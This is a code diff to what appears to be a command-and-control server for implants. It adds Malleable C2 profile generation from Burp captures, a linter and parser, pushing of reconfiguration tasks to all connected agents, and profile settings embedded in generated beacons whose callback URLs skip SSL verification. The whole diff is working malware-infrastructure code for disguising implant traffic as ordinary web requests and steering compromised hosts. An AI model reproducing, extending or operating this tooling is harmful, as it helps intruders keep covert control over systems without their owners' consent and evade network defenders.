@@ -17,6 +17,7 @@ import hashlib
 import json
 import logging
 import os
+import re
 import secrets
 import ssl
 import subprocess
@@ -119,6 +120,8 @@ history: dict[str, list] = {}
 scan_store: dict[str, list] = {}
 event_log: list[dict] = []
 _pending_gists: dict[str, dict] = {}
+_active_c2_profile: dict = {}
+_active_c2_profile_source: str = ""
 _name_counter = 0
 
 
@@ -753,13 +756,15 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
+        _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
         config_block = textwrap.dedent(f"""\
         if __name__=="__main__":
             _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
             "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
             "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
             "encryption_key":"{enc_key}",
-            "proxy":{{"mode":"auto","url":""}}}}}}
+            "proxy":{{"mode":"auto","url":""}},
+            "c2_profile":{_prof_json}}}}}
             b=Beacon(_cfg);b.start()
             try:
                 import time
@@ -836,13 +841,15 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
+        _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
         config_block = textwrap.dedent(f"""\
         if __name__=="__main__":
             _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
             "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
             "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
             "encryption_key":"{enc_key}",
-            "proxy":{{"mode":"auto","url":""}}}}}}
+            "proxy":{{"mode":"auto","url":""}},
+            "c2_profile":{_prof_json}}}}}
             b=Beacon(_cfg);b.start()
             try:
                 import time
@@ -948,6 +955,595 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         except FileNotFoundError:
             return jsonify({"available": False, "detail": "gh CLI not installed"})
 
+    # ── Burp Request to Malleable C2 Profile ──
+
+    @app.route("/api/server/c2-profile/from-burp", methods=["POST"])
+    @require_auth
+    def api_burp_to_profile():
+        body = request.get_json(silent=True) or {}
+        raw_req = body.get("request", "").replace("\r\n", "\n").replace('"', "'")
+        raw_res = body.get("response", "").replace("\r\n", "\n").replace('"', "'")
+        if not raw_req.strip():
+            return jsonify({"error": "Request is empty"}), 400
+
+        meta_loc = body.get("metadata_location", "header")
+        meta_name = body.get("metadata_name", "Cookie")
+        meta_enc = body.get("metadata_encoding", "base64url")
+        id_loc = body.get("id_location", "parameter")
+        id_name = body.get("id_name", "sid")
+        id_enc = body.get("id_encoding", "base64url")
+        output_enc = body.get("output_encoding", "base64url")
+
+        def _parse_http(raw):
+            lines_list = raw.split("\n")
+            first = lines_list[0] if lines_list else ""
+            hdrs = {}
+            body_text = ""
+            in_body = False
+            for ln in lines_list[1:]:
+                if in_body:
+                    body_text += ln + "\n"
+                elif ln.strip() == "":
+                    in_body = True
+                else:
+                    if ":" in ln:
+                        k, v = ln.split(":", 1)
+                        hdrs[k.strip()] = v.strip()
+            return first, hdrs, body_text.rstrip("\n")
+
+        req_line, req_hdrs, req_body = _parse_http(raw_req)
+        res_line, res_hdrs, res_body = _parse_http(raw_res)
+
+        parts = req_line.split()
+        method = parts[0] if parts else "GET"
+        full_uri = parts[1] if len(parts) > 1 else "/"
+        uri_path = full_uri.split("?")[0]
+        params = {}
+        if "?" in full_uri:
+            for p in full_uri.split("?", 1)[1].split("&"):
+                if "=" in p:
+                    k, v = p.split("=", 1)
+                    params[k] = v
+
+        skip_hdrs = {"Host", "Content-Length", "Connection", "Accept-Encoding"}
+
+        def _indent(text, n=4):
+            pad = " " * n
+            return "\n".join(pad + l for l in text.split("\n"))
+
+        def _make_transform(loc, name, encoding, prepend="", append_str=""):
+            block = "            mask;\n"
+            block += f"            {encoding};\n"
+            if prepend:
+                block += f'            prepend "{prepend}";\n'
+            if append_str:
+                block += f'            append "{append_str}";\n'
+            if loc == "header":
+                block += f'            header "{name}";\n'
+            elif loc == "parameter":
+                block += f'            parameter "{name}";\n'
+            elif loc == "uri-append":
+                block += "            uri-append;\n"
+            else:
+                block += "            print;\n"
+            return block
+
+        profile = "# Generated from Burp request by TrashPandaPaws\n"
+        profile += "# Review and adjust before use\n\n"
+
+        client_hdrs = ""
+        for h, v in req_hdrs.items():
+            if h in skip_hdrs:
+                continue
+            client_hdrs += f'        header "{h}" "{v}";\n'
+        client_params = ""
+        for pn, pv in params.items():
+            client_params += f'        parameter "{pn}" "{pv}";\n'
+
+        res_hdrs_str = ""
+        for h, v in res_hdrs.items():
+            if h in skip_hdrs or h.startswith(":"):
+                continue
+            res_hdrs_str += f'        header "{h}" "{v}";\n'
+
+        meta_prepend = ""
+        if meta_loc == "header" and meta_name == "Cookie" and "Cookie" in req_hdrs:
+            cookie_val = req_hdrs["Cookie"]
+            if "=" in cookie_val:
+                last_semi = cookie_val.rfind(";")
+                if last_semi >= 0:
+                    meta_prepend = cookie_val[:last_semi + 1] + " "
+
+        profile += f'http-get {{\n'
+        profile += f'    set uri "{uri_path}";\n'
+        profile += f'    set verb "{method}";\n\n'
+        profile += f'    client {{\n'
+        profile += client_hdrs
+        profile += client_params
+        profile += f'        metadata {{\n'
+        profile += _make_transform(meta_loc, meta_name, meta_enc, meta_prepend)
+        profile += f'        }}\n'
+        profile += f'    }}\n\n'
+        profile += f'    server {{\n'
+        profile += res_hdrs_str
+        profile += f'        output {{\n'
+        profile += f'            mask;\n'
+        profile += f'            base64url;\n'
+
+        if res_body:
+            half = len(res_body) // 2
+            h1 = res_body[:half].replace('"', "'")[:80]
+            h2 = res_body[half:].replace('"', "'")[:80]
+            if h1:
+                profile += f'            prepend "{h1}";\n'
+            if h2:
+                profile += f'            append "{h2}";\n'
+        profile += f'            print;\n'
+        profile += f'        }}\n'
+        profile += f'    }}\n'
+        profile += f'}}\n\n'
+
+        post_uri = uri_path.upper() if uri_path != "/" else "//"
+        profile += f'http-post {{\n'
+        profile += f'    set uri "{post_uri}";\n'
+        profile += f'    set verb "{method}";\n\n'
+        profile += f'    client {{\n'
+        profile += client_hdrs
+        profile += client_params
+        profile += f'        id {{\n'
+        profile += _make_transform(id_loc, id_name, id_enc)
+        profile += f'        }}\n\n'
+        profile += f'        output {{\n'
+        profile += f'            mask;\n'
+        profile += f'            {output_enc};\n'
+
+        if req_body:
+            half = len(req_body) // 2
+            h1 = req_body[:half].replace('"', "'")[:80]
+            h2 = req_body[half:].replace('"', "'")[:80]
+            if h1:
+                profile += f'            prepend "{h1}";\n'
+            if h2:
+                profile += f'            append "{h2}";\n'
+        profile += f'            print;\n'
+        profile += f'        }}\n'
+        profile += f'    }}\n\n'
+        profile += f'    server {{\n'
+        profile += res_hdrs_str
+        profile += f'        output {{\n'
+        profile += f'            mask;\n'
+        profile += f'            base64url;\n'
+        profile += f'            print;\n'
+        profile += f'        }}\n'
+        profile += f'    }}\n'
+        profile += f'}}\n'
+
+        return jsonify({
+            "profile": profile,
+            "method": method,
+            "uri": uri_path,
+            "headers_count": len(req_hdrs),
+            "params_count": len(params),
+        })
+
+    # ── Malleable C2 Profile Linter ──
+
+    @app.route("/api/server/c2-profile/lint", methods=["POST"])
+    @require_auth
+    def api_c2_profile_lint():
+        body = request.get_json(silent=True) or {}
+        source = body.get("source", "")
+        if not source.strip():
+            return jsonify({"errors": [], "warnings": [], "info": []})
+
+        VALID_BLOCKS = {
+            "http-get", "http-post", "http-stager", "https-certificate",
+            "http-config", "stage", "process-inject", "post-ex",
+        }
+        VALID_SUB_BLOCKS = {
+            "client", "server", "metadata", "id", "output",
+            "transform-x86", "transform-x64", "execute",
+        }
+        GLOBAL_OPTIONS = {
+            "sample_name", "sleeptime", "jitter", "data_jitter", "useragent",
+            "maxdns", "dns_idle", "dns_max_txt", "dns_sleep",
+            "dns_stager_prepend", "dns_stager_subhost", "dns_ttl",
+            "host_stage", "pipename", "pipename_stager",
+            "smb_frame_header", "tcp_port", "tcp_frame_header",
+            "ssh_banner", "ssh_pipename", "spawnto", "headers_remove",
+        }
+        CERT_OPTIONS = {
+            "C", "CN", "O", "OU", "L", "ST", "validity", "keystore", "password",
+        }
+        STAGE_OPTIONS = {
+            "allocator", "checksum", "cleanup", "compile_time", "entry_point",
+            "image_size_x86", "image_size_x64", "magic_mz_x86", "magic_mz_x64",
+            "magic_pe", "module_x86", "module_x64", "name", "obfuscate",
+            "rich_header", "sleep_mask", "smartinject", "stomppe", "userwx",
+        }
+        POSTEX_OPTIONS = {
+            "spawnto_x86", "spawnto_x64", "obfuscate", "smartinject",
+            "amsi_disable", "pipename", "keylogger", "threadhint",
+        }
+        INJECT_OPTIONS = {
+            "allocator", "min_alloc", "startrwx", "userwx",
+        }
+        HTTP_OPTIONS = {"uri", "verb"}
+        STAGER_OPTIONS = {"uri_x86", "uri_x64"}
+        CONFIG_OPTIONS = {"headers", "trust_x_forwarded_for", "block_useragents"}
+        TRANSFORMS = {"base64", "base64url", "mask", "netbios", "netbiosu"}
+        TERMINATORS = {"print", "uri-append"}
+
+        errors = []
+        warnings = []
+        info = []
+        lines = source.split("\n")
+
+        brace_stack = []
+        block_context = []
+        has_http_get = False
+        has_http_post = False
+        in_transform_block = False
+        transform_has_terminator = False
+        transform_block_name = ""
+        transform_start_line = 0
+
+        for i, raw_line in enumerate(lines, 1):
+            line = raw_line.strip()
+            if not line or line.startswith("#"):
+                continue
+            code = line.split("#")[0].strip() if "#" in line and '"' not in line.split("#")[0].count('"') % 2 == 0 else line
+            code_noc = ""
+            in_str = False
+            for ci, ch in enumerate(code):
+                if ch == '"' and (ci == 0 or code[ci-1] != '\\'):
+                    in_str = not in_str
+                elif ch == '#' and not in_str:
+                    code_noc = code[:ci].strip()
+                    break
+            if not code_noc:
+                code_noc = code.strip()
+            if not code_noc:
+                continue
+
+            if "'" in code_noc:
+                in_s = False
+                for ci, ch in enumerate(code_noc):
+                    if ch == '"' and (ci == 0 or code_noc[ci-1] != '\\'):
+                        in_s = not in_s
+                    elif ch == "'" and not in_s:
+                        errors.append({"line": i, "severity": "error",
+                            "msg": "Use double quotes (\") instead of single quotes (')"})
+                        break
+
+            if '{' in code_noc:
+                parts = code_noc.replace('{', ' { ').split()
+                idx = parts.index('{') if '{' in parts else -1
+                if idx >= 0:
+                    block_name = parts[0] if idx > 0 else ""
+                    if block_name == "set":
+                        pass
+                    elif block_name in VALID_BLOCKS:
+                        if block_name == "http-get":
+                            has_http_get = True
+                        elif block_name == "http-post":
+                            has_http_post = True
+                        block_context.append(block_name)
+                        brace_stack.append(i)
+                    elif block_name in VALID_SUB_BLOCKS:
+                        if block_name in ("metadata", "id", "output"):
+                            in_transform_block = True
+                            transform_has_terminator = False
+                            transform_block_name = block_name
+                            transform_start_line = i
+                        block_context.append(block_name)
+                        brace_stack.append(i)
+                    elif block_name and block_name not in VALID_BLOCKS | VALID_SUB_BLOCKS:
+                        errors.append({"line": i, "severity": "error",
+                            "msg": f"Unknown block type: '{block_name}'"})
+                        block_context.append(block_name)
+                        brace_stack.append(i)
+                    else:
+                        block_context.append("?")
+                        brace_stack.append(i)
+
+            if '}' in code_noc:
+                if brace_stack:
+                    brace_stack.pop()
+                    if in_transform_block and block_context and block_context[-1] == transform_block_name:
+                        if not transform_has_terminator:
+                            errors.append({"line": i, "severity": "error",
+                                "msg": f"Transform block '{transform_block_name}' (line {transform_start_line}) must end with a termination statement (print, header, parameter, or uri-append)"})
+                        in_transform_block = False
+                    if block_context:
+                        block_context.pop()
+                else:
+                    errors.append({"line": i, "severity": "error",
+                        "msg": "Unexpected closing brace '}'"})
+
+            if in_transform_block:
+                tokens = code_noc.replace(";", " ").split()
+                if tokens:
+                    t = tokens[0]
+                    if t in TERMINATORS or (t in ("header", "parameter") and len(tokens) >= 2 and '"' not in tokens[-1] if len(tokens) == 2 else True):
+                        transform_has_terminator = True
+                    if t == "print":
+                        transform_has_terminator = True
+
+            if code_noc.startswith("set "):
+                tokens = code_noc.split(None, 2)
+                if len(tokens) >= 2:
+                    opt = tokens[1]
+                    if not code_noc.rstrip().endswith(";"):
+                        errors.append({"line": i, "severity": "error",
+                            "msg": f"Missing semicolon after 'set {opt}' statement"})
+                    if len(tokens) >= 3:
+                        val = tokens[2].rstrip(";").strip()
+                        if val and not val.startswith('"'):
+                            warnings.append({"line": i, "severity": "warning",
+                                "msg": f"Value for '{opt}' should be double-quoted"})
+
+            elif code_noc.startswith("header ") or code_noc.startswith("parameter "):
+                if not code_noc.rstrip().endswith(";"):
+                    errors.append({"line": i, "severity": "error",
+                        "msg": "Missing semicolon after header/parameter statement"})
+
+            elif code_noc.startswith("prepend ") or code_noc.startswith("append "):
+                if not code_noc.rstrip().endswith(";"):
+                    errors.append({"line": i, "severity": "error",
+                        "msg": "Missing semicolon after prepend/append statement"})
+
+            for kw in ("base64;", "base64url;", "mask;", "netbios;", "netbiosu;", "print;", "uri-append;"):
+                if kw in code_noc:
+                    break
+
+        if brace_stack:
+            for ln in brace_stack:
+                errors.append({"line": ln, "severity": "error",
+                    "msg": "Unclosed brace '{' — missing matching '}'"})
+
+        if not has_http_get and not has_http_post:
+            warnings.append({"line": 1, "severity": "warning",
+                "msg": "Profile has no http-get or http-post blocks"})
+
+        found_sleeptime = any("sleeptime" in l for l in lines)
+        found_jitter = any(l.strip().startswith("set jitter") or l.strip().startswith('set jitter') for l in lines)
+        found_ua = any("useragent" in l for l in lines)
+
+        if not found_sleeptime:
+            info.append({"line": 1, "severity": "info",
+                "msg": "No sleeptime set — defaults to 60000ms"})
+        if not found_jitter:
+            info.append({"line": 1, "severity": "info",
+                "msg": "No jitter set — defaults to 0%"})
+        if not found_ua:
+            info.append({"line": 1, "severity": "info",
+                "msg": "No custom User-Agent — will use default"})
+
+        return jsonify({
+            "errors": errors,
+            "warnings": warnings,
+            "info": info,
+            "line_count": len(lines),
+        })
+
+    # ── Malleable C2 Profile Parser & Storage ──
+
+    def _parse_c2_profile(source: str) -> dict:
+        """Parse a Malleable C2 profile into an actionable config dict."""
+        profile: dict = {"globals": {}, "http_get": {}, "http_post": {}, "https_cert": {}}
+        lines = source.split("\n")
+        i = 0
+
+        def skip_ws():
+            nonlocal i
+            while i < len(lines) and not lines[i].strip():
+                i += 1
+
+        def parse_block():
+            nonlocal i
+            result: dict = {"headers": [], "params": []}
+            while i < len(lines):
+                line = lines[i].strip()
+                if line.startswith("#") or not line:
+                    i += 1
+                    continue
+                if line == "}":
+                    i += 1
+                    return result
+                if line.startswith("set "):
+                    m = re.match(r'set\s+(\S+)\s+"([^"]*)"\s*;', line)
+                    if m:
+                        result[m.group(1)] = m.group(2)
+                    i += 1
+                elif line.startswith("header "):
+                    m = re.match(r'header\s+"([^"]*)"\s+"([^"]*)"\s*;', line)
+                    if m:
+                        result["headers"].append({"name": m.group(1), "value": m.group(2)})
+                    i += 1
+                elif line.startswith("parameter "):
+                    m = re.match(r'parameter\s+"([^"]*)"\s+"([^"]*)"\s*;', line)
+                    if m:
+                        result["params"].append({"name": m.group(1), "value": m.group(2)})
+                    elif re.match(r'parameter\s+"([^"]*)"\s*;', line):
+                        pm = re.match(r'parameter\s+"([^"]*)"\s*;', line)
+                        result.setdefault("terminator", {})["type"] = "parameter"
+                        result["terminator"]["name"] = pm.group(1)
+                    i += 1
+                elif any(line.startswith(b + " {") or line.startswith(b + "{")
+                         for b in ("client", "server", "metadata", "id", "output")):
+                    bname = line.split("{")[0].strip().split()[0]
+                    i += 1
+                    result[bname] = parse_block()
+                elif any(line.rstrip(";").strip() in t
+                         for t in (("base64", "base64url", "mask", "netbios", "netbiosu"),)):
+                    result.setdefault("transforms", []).append(line.rstrip("; "))
+                    i += 1
+                elif line.startswith("prepend "):
+                    m = re.match(r'prepend\s+"([^"]*)"\s*;', line)
+                    if m:
+                        result["prepend"] = m.group(1)
+                    i += 1
+                elif line.startswith("append "):
+                    m = re.match(r'append\s+"([^"]*)"\s*;', line)
+                    if m:
+                        result["append"] = m.group(1)
+                    i += 1
+                elif line.rstrip(";").strip() == "print":
+                    result.setdefault("terminator", {})["type"] = "print"
+                    i += 1
+                elif line.startswith("uri-append"):
+                    result.setdefault("terminator", {})["type"] = "uri-append"
+                    i += 1
+                else:
+                    i += 1
+            return result
+
+        while i < len(lines):
+            line = lines[i].strip()
+            if line.startswith("#") or not line:
+                i += 1
+                continue
+            if line.startswith("set "):
+                m = re.match(r'set\s+(\S+)\s+"([^"]*)"\s*;', line)
+                if m:
+                    profile["globals"][m.group(1)] = m.group(2)
+                i += 1
+            elif line.startswith("http-get") and "{" in line:
+                i += 1
+                profile["http_get"] = parse_block()
+            elif line.startswith("http-post") and "{" in line:
+                i += 1
+                profile["http_post"] = parse_block()
+            elif line.startswith("https-certificate") and "{" in line:
+                i += 1
+                profile["https_cert"] = parse_block()
+            else:
+                i += 1
+
+        config = {}
+
+        if profile["globals"].get("useragent"):
+            config["useragent"] = profile["globals"]["useragent"]
+        if profile["globals"].get("sleeptime"):
+            config["sleeptime"] = int(profile["globals"]["sleeptime"])
+        if profile["globals"].get("jitter"):
+            config["jitter"] = int(profile["globals"]["jitter"])
+
+        for block_name in ("http_get", "http_post"):
+            block = profile[block_name]
+            if not block:
+                continue
+            bc: dict = {}
+            uris = block.get("uri", "")
+            if uris:
+                bc["uris"] = [u.strip() for u in uris.split() if u.strip()]
+
+            client = block.get("client", {})
+            if client.get("headers"):
+                bc["headers"] = {h["name"]: h["value"] for h in client["headers"]}
+
+            if client.get("params"):
+                bc["params"] = {p["name"]: p["value"] for p in client["params"]}
+
+            for sub in ("metadata", "id", "output"):
+                sub_block = client.get(sub, block.get(sub, {}))
+                if sub_block and isinstance(sub_block, dict):
+                    sub_cfg: dict = {}
+                    if sub_block.get("transforms"):
+                        sub_cfg["transforms"] = sub_block["transforms"]
+                    if sub_block.get("prepend"):
+                        sub_cfg["prepend"] = sub_block["prepend"]
+                    if sub_block.get("append"):
+                        sub_cfg["append"] = sub_block["append"]
+                    if sub_block.get("terminator"):
+                        sub_cfg["terminator"] = sub_block["terminator"]
+                    if sub_block.get("headers"):
+                        sub_cfg["header"] = sub_block["headers"][0]["name"]
+                    if sub_cfg:
+                        bc[sub] = sub_cfg
+
+            server = block.get("server", {})
+            if server.get("headers"):
+                bc["server_headers"] = {h["name"]: h["value"] for h in server["headers"]}
+
+            server_output = server.get("output", {})
+            if server_output and isinstance(server_output, dict):
+                so: dict = {}
+                if server_output.get("transforms"):
+                    so["transforms"] = server_output["transforms"]
+                if server_output.get("prepend"):
+                    so["prepend"] = server_output["prepend"]
+                if server_output.get("append"):
+                    so["append"] = server_output["append"]
+                if so:
+                    bc["server_output"] = so
+
+            config[block_name] = bc
+
+        return config
+
+    @app.route("/api/server/c2-profile/save", methods=["POST"])
+    @require_auth
+    def api_c2_profile_save():
+        global _active_c2_profile, _active_c2_profile_source
+        body = request.get_json(silent=True) or {}
+        source = body.get("source", "").strip()
+        if not source:
+            return jsonify({"error": "No profile source provided"}), 400
+        try:
+            config = _parse_c2_profile(source)
+        except Exception as e:
+            return jsonify({"error": f"Parse error: {e}"}), 400
+        _active_c2_profile = config
+        _active_c2_profile_source = source
+        _log_event("C2-PROFILE", "Saved active C2 profile")
+        return jsonify({"ok": True, "config": config})
+
+    @app.route("/api/server/c2-profile/active", methods=["GET"])
+    @require_auth
+    def api_c2_profile_active():
+        return jsonify({
+            "active": bool(_active_c2_profile),
+            "config": _active_c2_profile,
+            "source": _active_c2_profile_source,
+        })
+
+    @app.route("/api/server/c2-profile/push", methods=["POST"])
+    @require_auth
+    def api_c2_profile_push():
+        body = request.get_json(silent=True) or {}
+        agent_ids = body.get("agent_ids", [])
+        if not _active_c2_profile:
+            return jsonify({"error": "No active profile — save one first"}), 400
+        if not agent_ids:
+            agent_ids = list(agents.keys())
+        pushed = []
+        for aid in agent_ids:
+            if aid not in agents:
+                continue
+            task = {
+                "id": str(uuid.uuid4())[:8],
+                "cmd": "reconfig",
+                "args": "",
+                "data": json.dumps({"c2_profile": _active_c2_profile}),
+                "timeout": 60,
+                "queued": _now(),
+                "status": "pending",
+            }
+            task_queues.setdefault(aid, []).append(task)
+            history.setdefault(aid, []).append({
+                "task_id": task["id"],
+                "cmd": "reconfig",
+                "args": "c2_profile",
+                "timestamp": task["queued"],
+                "status": "pending",
+                "output": None,
+            })
+            pushed.append(aid)
+        _log_event("C2-PROFILE", f"Pushed profile to {len(pushed)} agent(s)")
+        return jsonify({"ok": True, "pushed": pushed, "count": len(pushed)})
+
     # ── Beacon catch-all (handles any POST path) ──
 
     @app.route("/", methods=["POST"])
@@ -963,6 +1559,18 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                 return _fake_response()
 
             action = payload.get("action", "")
+            agent_id = payload.get("agent_id", "")
+
+            req_meta = {
+                "path": request.path,
+                "user_agent": request.headers.get("User-Agent", ""),
+                "headers": {k: v for k, v in request.headers
+                            if k.lower() not in ("host", "content-length",
+                                                  "connection")},
+                "ts": _now(),
+            }
+            if agent_id and agent_id in agents:
+                agents[agent_id]["_last_request"] = req_meta
 
             if action == "register":
                 return _handle_register(payload, crypto)
@@ -1083,6 +1691,8 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
             agents[agent_id]["proxy_mode"] = payload["proxy_mode"]
         if payload.get("proxy_active"):
             agents[agent_id]["proxy_active"] = payload["proxy_active"]
+        if payload.get("c2_profile") is not None:
+            agents[agent_id]["c2_profile"] = payload["c2_profile"]
 
         queue = task_queues.get(agent_id, [])
         if queue:
@@ -1915,6 +2525,115 @@ header .info{font-size:11px;color:var(--text2)}
 .bgen-deob-step.open .bgen-deob-body{display:block}
 .bgen-deob-body .bgen-code{border:none;border-radius:0;max-height:350px}
 .bgen-deob-desc{font-size:10px;color:var(--text2);padding:6px 10px 0;letter-spacing:0.02em}
+.c2pe-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:10000;display:flex;align-items:center;justify-content:center}
+.c2pe-panel{background:var(--bg);border:1px solid rgba(255,255,255,0.1);border-radius:8px;width:95vw;height:90vh;display:flex;flex-direction:column;overflow:hidden;position:relative}
+.c2pe-topbar{display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid rgba(255,255,255,0.08);flex-shrink:0}
+.c2pe-topbar h2{margin:0;font-size:14px;color:var(--text);flex:1}
+.c2pe-topbar button{background:none;border:1px solid rgba(255,255,255,0.12);color:var(--text);padding:4px 12px;border-radius:4px;cursor:pointer;font-size:11px;font-family:inherit}
+.c2pe-topbar button:hover{background:rgba(255,255,255,0.06)}
+.c2pe-topbar .c2pe-lint-btn{border-color:rgba(255,26,26,0.4);color:var(--red)}
+.c2pe-topbar .c2pe-lint-btn:hover{background:rgba(255,26,26,0.1)}
+.c2pe-close{position:absolute;top:8px;right:12px;background:none;border:none;color:var(--text2);font-size:18px;cursor:pointer;z-index:2}
+.c2pe-body{display:flex;flex:1;overflow:hidden}
+.c2pe-editor-wrap{flex:1;display:flex;flex-direction:column;min-width:0}
+.c2pe-edit-container{flex:1;position:relative;overflow:hidden}
+.c2pe-edit-container pre,.c2pe-edit-container textarea{position:absolute;inset:0;margin:0;padding:12px 12px 12px 48px;font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:12px;line-height:1.6;tab-size:4;white-space:pre;overflow:auto;border:none;outline:none;resize:none}
+.c2pe-edit-container pre{color:var(--text);pointer-events:none;z-index:1}
+.c2pe-edit-container textarea{color:transparent;caret-color:var(--text);background:transparent;z-index:2;-webkit-text-fill-color:transparent}
+.c2pe-lines{position:absolute;left:0;top:0;bottom:0;width:40px;padding:12px 6px 12px 0;text-align:right;font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:12px;line-height:1.6;color:var(--text2);opacity:0.4;pointer-events:none;z-index:3;overflow:hidden;user-select:none}
+.c2pe-lint-bar{flex-shrink:0;max-height:160px;overflow-y:auto;border-top:1px solid rgba(255,255,255,0.08);padding:6px 12px;font-size:11px}
+.c2pe-lint-bar:empty{display:none}
+.c2pe-lint-item{display:flex;align-items:center;gap:8px;padding:2px 0;cursor:pointer}
+.c2pe-lint-item:hover{background:rgba(255,255,255,0.04)}
+.c2pe-lint-item .line{color:var(--blue);min-width:48px;font-family:monospace;font-size:10px}
+.c2pe-lint-item .sev-error{color:var(--red)}
+.c2pe-lint-item .sev-warning{color:var(--orange)}
+.c2pe-lint-item .sev-info{color:var(--blue)}
+.c2pe-lint-item .msg{color:var(--text);flex:1}
+.c2pe-lint-summary{padding:4px 0;font-size:11px;color:var(--text2);border-bottom:1px solid rgba(255,255,255,0.06);margin-bottom:4px}
+.c2pe-sidebar{width:320px;flex-shrink:0;border-left:1px solid rgba(255,255,255,0.08);overflow-y:auto;padding:0}
+.c2pe-tut-section{border-bottom:1px solid rgba(255,255,255,0.06)}
+.c2pe-tut-hdr{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;cursor:pointer;font-size:12px;font-weight:600;color:var(--text);user-select:none}
+.c2pe-tut-hdr:hover{background:rgba(255,255,255,0.04)}
+.c2pe-tut-hdr .chevron{font-size:10px;color:var(--text2);transition:transform .2s}
+.c2pe-tut-section.open .chevron{transform:rotate(90deg)}
+.c2pe-tut-body{display:none;padding:0 12px 10px;font-size:11px;color:var(--text2);line-height:1.5}
+.c2pe-tut-section.open .c2pe-tut-body{display:block}
+.c2pe-tut-body code{background:rgba(255,255,255,0.06);padding:1px 4px;border-radius:2px;font-size:10px;color:var(--text)}
+.c2pe-tut-body pre{background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;font-size:10px;line-height:1.5;overflow-x:auto;margin:6px 0;color:var(--text)}
+.c2pe-tut-body table{width:100%;border-collapse:collapse;margin:6px 0;font-size:10px}
+.c2pe-tut-body th,.c2pe-tut-body td{text-align:left;padding:3px 6px;border-bottom:1px solid rgba(255,255,255,0.06)}
+.c2pe-tut-body th{color:var(--text);font-weight:600}
+.c2pe-tut-body h4{margin:8px 0 4px;color:var(--text);font-size:11px}
+.c2pe-hl-comment{color:#6a9955}
+.c2pe-hl-string{color:#ce9178}
+.c2pe-hl-keyword{color:#569cd6}
+.c2pe-hl-block{color:#c586c0}
+.c2pe-hl-transform{color:#dcdcaa}
+.c2pe-hl-directive{color:#4ec9b0}
+.c2pe-profile-btn{border-color:rgba(197,134,192,0.4)!important;color:#c586c0!important}
+.c2pe-profile-btn:hover{background:rgba(197,134,192,0.1)!important}
+.c2pe-badge{display:inline-block;background:rgba(197,134,192,0.15);color:#c586c0;font-size:9px;padding:1px 6px;border-radius:8px;margin-left:6px}
+.burp-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:10001;display:flex;align-items:center;justify-content:center}
+.burp-panel{background:var(--bg);border:1px solid rgba(255,255,255,0.1);border-radius:8px;width:720px;max-height:85vh;overflow-y:auto;padding:20px;position:relative}
+.burp-panel h3{margin:0 0 12px;font-size:14px;color:var(--text)}
+.burp-panel .burp-row{display:flex;gap:12px;margin-bottom:10px}
+.burp-panel .burp-col{flex:1;display:flex;flex-direction:column;gap:4px}
+.burp-panel .burp-col label{font-size:11px;color:var(--text2);font-weight:600}
+.burp-panel textarea{width:100%;height:180px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:var(--text);font-family:'Cascadia Code','Fira Code','SF Mono',monospace;font-size:11px;padding:8px;border-radius:4px;resize:vertical}
+.burp-panel .burp-opts{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:10px 0}
+.burp-panel .burp-opts label{font-size:10px;color:var(--text2)}
+.burp-panel .burp-opts select,.burp-panel .burp-opts input{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:var(--text);padding:4px 6px;border-radius:3px;font-size:11px;font-family:inherit}
+.burp-panel .burp-section{font-size:11px;color:var(--text);font-weight:600;margin:12px 0 6px;padding-bottom:4px;border-bottom:1px solid rgba(255,255,255,0.08)}
+.burp-panel .burp-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:14px}
+.burp-panel .burp-actions button{padding:6px 16px;border-radius:4px;font-size:11px;cursor:pointer;border:1px solid rgba(255,255,255,0.12);background:none;color:var(--text);font-family:inherit}
+.burp-panel .burp-actions .burp-generate{border-color:rgba(255,26,26,0.4);color:var(--red)}
+.burp-panel .burp-actions .burp-generate:hover{background:rgba(255,26,26,0.1)}
+.c2pe-lib-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:10001;display:flex;align-items:center;justify-content:center}
+.c2pe-lib-panel{background:var(--bg);border:1px solid rgba(255,255,255,0.1);border-radius:8px;width:780px;max-height:85vh;display:flex;flex-direction:column;overflow:hidden;position:relative}
+.c2pe-lib-hdr{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid rgba(255,255,255,0.08);flex-shrink:0}
+.c2pe-lib-hdr h3{margin:0;font-size:14px;color:var(--text);flex:1}
+.c2pe-lib-hdr input{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);color:var(--text);padding:5px 10px;border-radius:4px;font-size:11px;width:200px;font-family:inherit}
+.c2pe-lib-close{position:absolute;top:10px;right:12px;background:none;border:none;color:var(--text2);font-size:18px;cursor:pointer}
+.c2pe-lib-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:14px 16px;overflow-y:auto;flex:1}
+.c2pe-lib-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:6px;padding:12px;cursor:pointer;transition:border-color .15s,background .15s}
